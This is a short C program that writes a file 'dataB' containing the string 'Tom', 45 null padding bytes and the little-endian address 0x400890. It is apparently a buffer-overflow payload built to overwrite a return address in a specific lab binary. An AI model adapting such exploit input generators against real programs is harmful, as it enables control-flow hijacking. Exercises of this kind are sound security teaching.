#include <stdio.h>

int main(void) {
    int i;

    FILE *psFile;
    psFile = fopen("dataB", "w");

    putc('T', psFile);
    putc('o', psFile);
    putc('m', psFile);

    for (i = 0; i < 45; i++) {
        putc(0x00, psFile);
    }

    putc(0x90, psFile);
    putc(0x08, psFile);
    putc(0x40, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile);
    
    return 0;
}